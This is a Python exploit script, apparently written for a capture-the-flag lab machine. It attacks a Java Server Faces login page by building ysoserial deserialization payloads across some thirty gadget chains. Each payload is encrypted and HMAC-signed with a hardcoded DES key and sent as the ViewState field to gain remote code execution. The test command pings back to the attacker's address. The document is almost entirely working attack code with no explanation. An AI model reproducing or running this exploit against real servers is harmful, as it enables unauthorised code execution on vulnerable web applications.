import urllib
import base64
import subprocess
import requests
import hashlib
import pyDes
import hmac

url = "http://10.10.10.130:8080/userSubscribe.faces"
r = requests.get(url)
cookie = r.headers['set-cookie']

secret = base64.b64decode("SnNGOTg3Ni0=")
cipher = pyDes.des(secret, pad=None, padmode=pyDes.PAD_PKCS5)

types = ["BeanShell1", "C3P0", "Clojure", "CommonsBeanutils1", "CommonsCollections1", "CommonsCollections2", "CommonsCollections3", "CommonsCollections4", "CommonsCollections5", "CommonsCollections6", "FileUpload1", "Groovy1", "Hibernate1", "Hibernate2", "JBossInterceptors1", "JRMPClient", "JRMPListener", "JSON1", "JavassistWeld1", "Jdk7u21", "Jython1", "MozillaRhino1", "Myfaces1", "Myfaces2", "ROME", "Spring1", "Spring2", "URLDNS", "Wicket1"]
for type in types:
	try:
		cmd = 'ping 10.10.14.12'
		ysoserial = 'java -jar /opt/ysoserial.jar ' + type + ' "' + cmd + '"'
		payload = subprocess.check_output(ysoserial, shell=True)
		payload = cipher.encrypt(payload)
		hmacSignature = hmac.new(secret, payload, hashlib.sha1).digest()
		payload = base64.b64encode(payload + hmacSignature)
		payload = urllib.quote(payload)

		headers = {"Cookie": cookie, "Content-Type": "application/x-www-form-urlencoded"}
		data = "j_id_jsp_1623871077_1%3Aemail=caca&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState=" + payload
		r = requests.post(url, data=data, headers=headers)
	except:
		continue
